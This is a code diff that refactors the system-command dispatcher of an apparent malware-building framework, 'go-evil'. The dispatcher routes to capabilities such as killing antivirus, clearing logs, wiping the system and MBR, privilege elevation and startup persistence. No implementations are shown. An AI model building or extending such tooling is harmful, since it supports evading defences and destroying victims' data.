@@ -14,105 +14,106 @@ import (
 	systemcommands "github.com/TeamPhoneix/go-evil/domains/system/system_commands"
 	"github.com/TeamPhoneix/go-evil/domains/system/users"
 	"github.com/TeamPhoneix/go-evil/domains/system/wipe"
+	"github.com/TeamPhoneix/go-evil/utility/structure/json"
 	"github.com/s9rA16Bf4/notify_handler/go/notify"
 )
 
 // The main parser for the system domain
-func Parser(function string, value string, s_json string) ([]string, string) {
+func Parser(function string, value string, data_object *json.Json_t) []string {
 	call := []string{}
 
 	switch function {
 	case "out":
-		call, s_json = io.Out(s_json, value)
+		call = io.Out(value, data_object)
 
 	case "outln":
-		call, s_json = io.Outln(s_json, value)
+		call = io.Outln(value, data_object)
 
 	case "in":
-		call, s_json = io.Input(s_json)
+		call = io.Input(data_object)
 
 	case "exit":
-		call, s_json = stop.Exit(s_json, value)
+		call = stop.Exit(value, data_object)
 
 	case "exec":
-		call, s_json = systemcommands.Exec(s_json, value)
+		call = systemcommands.Exec(value, data_object)
 
 	case "abort":
-		call, s_json = stop.Abort(s_json, value)
+		call = stop.Abort(value, data_object)
 
 	case "reboot":
-		call, s_json = systemcommands.Reboot(s_json)
+		call = systemcommands.Reboot(data_object)
 
 	case "shutdown":
-		call, s_json = systemcommands.Shutdown(s_json)
+		call = systemcommands.Shutdown(data_object)
 
 	case "add_to_startup":
-		call, s_json = startup.Add(s_json)
+		call = startup.Add(data_object)
 
 	case "list_dir":
-		call, s_json = directories.List(s_json, value)
+		call = directories.List(value, data_object)
 
 	case "write":
-		call, s_json = io.Write(s_json, value)
+		call = io.Write(value, data_object)
 
 	case "read":
-		call, s_json = io.Read(s_json, value)
+		call = io.Read(value, data_object)
 
 	case "remove":
-		call, s_json = io.Remove(value, s_json)
+		call = io.Remove(value, data_object)
 
 	case "move":
-		call, s_json = io.Move(value, s_json)
+		call = io.Move(value, data_object)
 
 	case "copy":
-		call, s_json = io.Copy(value, s_json)
+		call = io.Copy(value, data_object)
 
 	case "change_background":
-		call, s_json = systemcommands.Change_background(value, s_json)
+		call = systemcommands.Change_background(value, data_object)
 
 	case "elevate":
-		call, s_json = systemcommands.Elevate(value, s_json)
+		call = systemcommands.Elevate(value, data_object)
 
 	case "create_user":
-		call, s_json = users.Create(value, s_json)
+		call = users.Create(value, data_object)
 
 	case "kill_process_id":
-		call, s_json = processes.Kill_id(value, s_json)
+		call = processes.Kill_id(value, data_object)
 
 	case "kill_process_name":
-		call, s_json = processes.Kill_name(value, s_json)
+		call = processes.Kill_name(value, data_object)
 
 	case "kill_antivirus":
-		call, s_json = antivirus.Kill(value, s_json)
+		call = antivirus.Kill(value, data_object)
 
 	case "clear_logs":
-		call, s_json = logs.Clear(value, s_json)
+		call = logs.Clear(value, data_object)
 
 	case "wipe_system":
-		call, s_json = wipe.System(value, s_json)
+		call = wipe.System(value, data_object)
 
 	case "wipe_mbr":
-		call, s_json = wipe.Mbr(value, s_json)
+		call = wipe.Mbr(value, data_object)
 
 	case "get_disks":
-		call, s_json = disks.Get(value, s_json)
+		call = disks.Get(value, data_object)
 
 	case "get_users":
-		call, s_json = users.Get(value, s_json)
+		call = users.Get(value, data_object)
 
 	case "get_processes":
-		call, s_json = processes.Get(value, s_json)
+		call = processes.Get(value, data_object)
 
 	case "get_processes_name":
-		call, s_json = processes.Get_names(value, s_json)
+		call = processes.Get_names(value, data_object)
 
 	case "get_processes_pid":
-		call, s_json = processes.Get_pids(value, s_json)
+		call = processes.Get_pids(value, data_object)
 
 	default:
 		notify.Error(fmt.Sprintf("Unknown function '%s'", function), "system.Parser()")
 
 	}
 
-	return call, s_json
+	return call
 }
